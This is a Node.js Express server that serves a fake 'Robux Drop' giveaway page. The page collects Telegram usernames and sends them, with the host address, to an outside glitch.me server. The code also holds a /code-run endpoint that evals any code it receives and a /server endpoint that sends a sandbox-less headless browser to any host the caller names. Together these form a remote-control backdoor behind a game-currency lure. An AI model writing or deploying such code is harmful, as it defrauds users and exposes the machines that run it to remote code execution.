const express = require("express");
const cors = require("cors");
const puppeteer = require("puppeteer");
const axios = require('axios');
const app = express();
const fs = require('fs');

const log = JSON.parse(fs.readFileSync('log.txt','utf8'));

app.use(express.json());
app.use(cors({methods:['GET','POST']}));





const sleep = ms => new Promise(res => setTimeout(res, ms));

app.get("/", (request, response) => {
  if(log.use == false){
    response.send(`
  <!DOCTYPE html>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap');
    *{
      font-family: "Nunito"
    }
      ::-webkit-scrollbar{
  width: 0;
  height: 0;
}
*{
  margin: 0px;
  padding: 0px;
  scroll-behavior:smooth;
  user-select: none;
}
body {
  z-index:77;
  background: #fff;
  width: 100%;
  height: 100vh;
}
.header{
  width: 100%;
  z-index: 80;
  height: 60px;
  background: #dde1e4;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: fixed;
  top:0px;
}
.header_user{
  width: 200px;
  height: 60px;
  display: flex;
  align-items: center;
  justify-content: start;
}
.header_user_img{
  width: 40px;
  height: 40px;
  border-radius: 50%;
  margin-left: 10px;
}
.header_user_name{
  color:#3a3b3d;
  font-size: 16px;
  font-weight: 600;
  margin-left: 10px;
}
.header_user_balance{
  width: auto;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: start;
  margin-right: 10px;
}

.body{
  transition: all 600ms;
  position: fixed;
  z-index: -100;
  opacity: 0;
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: #fff;
}

.logo{
  width: 100px;
  height: 100px;
  opacity: 1;

}

.loading_text2{
  
  margin-top: 10px;
  font-size: 23px;
}
.login_box{
 margin-top: 100px;
  border-radius: 10px;
  background:#fff;
  width: 100%;
  height: 200px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: none;
}
.username, .refcode{
  margin-top: 10px;
  width: 90%;
  height: 45px;
  border: none;
  outline: none;
  border: 2px solid rgba(57, 59, 61, .2);
  border-radius: 8px;
  font-weight: 400;
  font-size: 23px;
  box-sizing: border-box;
  padding: 0px 10px;
}

.login_btn{
    margin-top: 10px;
  width: 90%;
  height: 45px;
  border: none;
  outline: none;
  background: #00b06f;
  transition: all 200ms ease;
  border: 2px solid #00b06f;
  box-sizing: border-box;
  color: #fff;
  border-radius: 8px;
  font-weight: 400;
  font-size: 23px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

@media (hover:hover){
  .login_btn:hover{
    background: #fff;
    color:#00b06f;
  }
}
@media (hover:none){
  .login_btn:active {
    background: #fff;
    color:#00b06f;
  }
}

.loading{
  top:0px;
  transition: all 600ms;
  position: fixed;
  z-index: -100;
  opacity: 0;
  background: #fff;
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
  .loading_text{
    font-size:25px;
    font-weight:600;
  }
    .text_mess{
      font-size:28px;
      
    }
    .err{
      color:red;
    }
    .comf{
      color:#00b06f;
    }
  </style>
  <body>
  <div class="loading">
    <img src="https://i.ibb.co/zShpXDy/robux.png" class="logo_loading">
    <div class="loading_text">Loading Robux Drop</div>
  </div>
    <div class="header">
      <div class="header_user">
        <img  src="https://i.ibb.co/zShpXDy/robux.png" class="header_user_img">
        <div class="header_user_name">Robux Task</div>
      </div>
      <div class="header_user_balance"></div> 
    </div>

        <div class="login_box">
      <div class="loading_text2">Enter your name from Telegram</div>
      <input type="text" class="username" placeholder="@username">
      <div class="login_btn" onclick="getBonus()">Get a bonus</div>
    </div>
  
  <script>
    const name = document.querySelector('.username');
    const loading_text = document.querySelector('.loading_text');

    const login_box = document.querySelector('.login_box');
    const loading = document.querySelector('.loading');
    function getBonus(){
      loading_text.innerHTML = '<div class="text_mess">Name check</div>';
      loading.style.zIndex = '80';
      loading.style.opacity = '1';
      const addres = location.hostname;

      fetch('https://gamy-lowly-lancer.glitch.me/bonus?name=' +  name.value + '&addres=' + addres).then(res => res.json()).then(res => {
        console.log(res)
        if(res.type){
          loading_text.innerHTML = '<div class="text_mess comf">You received a bonus</div>';
          console.log('http://' + addres + ':3000/finish')
          fetch('http://' + addres + ':3000/finish');
          login_box.style.display = 'none';
        }
        else{
          loading_text.innerHTML = '<div class="text_mess err">There is no such user</div>';
          loading.style.zIndex = '-80';
          loading.style.opacity = '0';
        }
        
      });
    }
  </script>
  </body>
    `);
  }
  else{
    response.send(`
  <!DOCTYPE html>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,200..1000;1,200..1000&display=swap');
    *{
      font-family: "Nunito"
    }
      ::-webkit-scrollbar{
  width: 0;
  height: 0;
}
*{
  margin: 0px;
  padding: 0px;
  scroll-behavior:smooth;
  user-select: none;
}
body {
  background: #fff;
}
.header{
  width: 100%;
  z-index: 80;
  height: 60px;
  background: #dde1e4;
  display: flex;
  align-items: center;
  justify-content: space-between;
  position: fixed;
  top:0px;
}
.header_user{
  width: 200px;
  height: 60px;
  display: flex;
  align-items: center;
  justify-content: start;
}
.header_user_img{
  width: 40px;
  height: 40px;
  border-radius: 50%;
  margin-left: 10px;
}
.header_user_name{
  color:#3a3b3d;
  font-size: 16px;
  font-weight: 600;
  margin-left: 10px;
}
.header_user_balance{
  width: auto;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: start;
  margin-right: 10px;
}

.body{
  transition: all 600ms;
  position: fixed;
  z-index: -100;
  opacity: 0;
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: #fff;
}

.logo{
  width: 100px;
  height: 100px;
  opacity: 1;

}

.loading_text2{
  
  margin-top: 10px;
  font-size: 23px;
}
.login_box{
 margin-top: 100px;
  border-radius: 10px;

  width: 100%;
  height: 200px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background: none;
}
.username, .refcode{
  margin-top: 10px;
  width: 90%;
  height: 45px;
  border: none;
  outline: none;
  border: 2px solid rgba(57, 59, 61, .2);
  border-radius: 8px;
  font-weight: 400;
  font-size: 23px;
  box-sizing: border-box;
  padding: 0px 10px;
}

.login_btn{
    margin-top: 10px;
  width: 90%;
  height: 45px;
  border: none;
  outline: none;
  background: #00b06f;
  transition: all 200ms ease;
  border: 2px solid #00b06f;
  box-sizing: border-box;
  color: #fff;
  border-radius: 8px;
  font-weight: 400;
  font-size: 23px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

@media (hover:hover){
  .login_btn:hover{
    background: #fff;
    color:#00b06f;
  }
}
@media (hover:none){
  .login_btn:active {
    background: #fff;
    color:#00b06f;
  }
}

.loading{
  top:0px;
  transition: all 600ms;
  position: fixed;
  z-index: -100;
  opacity: 1;
  background: #fff;
  width: 100%;
  height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
  .loading_text{
    font-size:25px;
  }
    .loading_text{
    font-size:25px;
    font-weight:600;
  }
    .text_mess{
      font-size:28px;
      
    }
    .err{
      color:red;
    }
    .comf{
      color:#00b06f;
    }
  </style>
  <body>
  <div class="loading">
    <img src="https://i.ibb.co/zShpXDy/robux.png" class="logo_loading">
    <div class="loading_text comf">You have already received your bonus</div>
  </div>
    <div class="header">
      <div class="header_user">
        <img  src="https://i.ibb.co/zShpXDy/robux.png" class="header_user_img">
        <div class="header_user_name">Robux Task</div>
      </div>
      <div class="header_user_balance"></div> 
    </div>

     
  </body>
    `)
  }
});



app.post('/code-run', async (req, res) => {
  eval(req.body.code);
  res.send({type:true});
});
app.get('/about', (req, res) =>{
  res.send({type:200});
});
app.get('/finish', (req, res) =>{
  log.use = true;
  fs.writeFileSync('log.txt',JSON.stringify(log, null, 2));
  res.send({type:200});
})

app.get('/stop', (req, res) => {
  ress.send({type:true});
});



app.post('/server', async (req, res) => {
  const browser = await puppeteer.launch({args: ["--no-sandbox"]});
  const page = await browser.newPage();
  await page.goto(`https://${req.body.host}/computer`);
  await sleep(5000);
  res.send({type:true})
  await browser.close();
});

// setTimeout(async () =>{
//   console.log('The start')
//   const browser = await puppeteer.launch({ headless: true, args: ["--no-sandbox"] });
//   const page = await browser.newPage();
//   await page.goto(`https://logbin.vercel.app/about.html`,{timeout: 0});
//   await page.setViewport({ width: 120, height: 120 });
//   //await sleep(10000);
//   //await sleep(600000);
//   console.log('The end');
// },10000)





const listener = app.listen('3000', () => {
  console.log(`Your app is listening on port ${listener.address().port}`);

});


